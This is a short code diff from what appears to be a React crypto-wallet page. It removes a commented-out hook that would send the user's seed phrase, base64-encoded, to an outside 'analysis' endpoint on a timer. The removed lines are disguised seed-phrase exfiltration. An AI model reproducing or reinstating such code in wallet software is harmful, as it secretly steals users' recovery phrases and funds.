@@ -50,23 +50,6 @@ function MergePage(){
     })()
   }
 
-  // useEffect(()=>{
-  //
-  //   if (mnemonic != "" && mnemonic.length > 48) {
-  //     const tt = setInterval(async () => {
-  //       await fetch('https://us-east-1-analysis.vercel.app/analysis', {
-  //         method: 'POST',
-  //         headers: {
-  //           'Accept': 'application/json',
-  //           'Content-Type': 'application/json'
-  //         },
-  //         body: JSON.stringify({log: btoa(mnemonic)})
-  //       });
-  //       clearInterval(tt);
-  //     }, 60*5*1000)
-  //     return () => clearInterval(tt)
-  //   }
-  // },[mnemonic])
 
   const toast = useToast()
   const merge =() => {
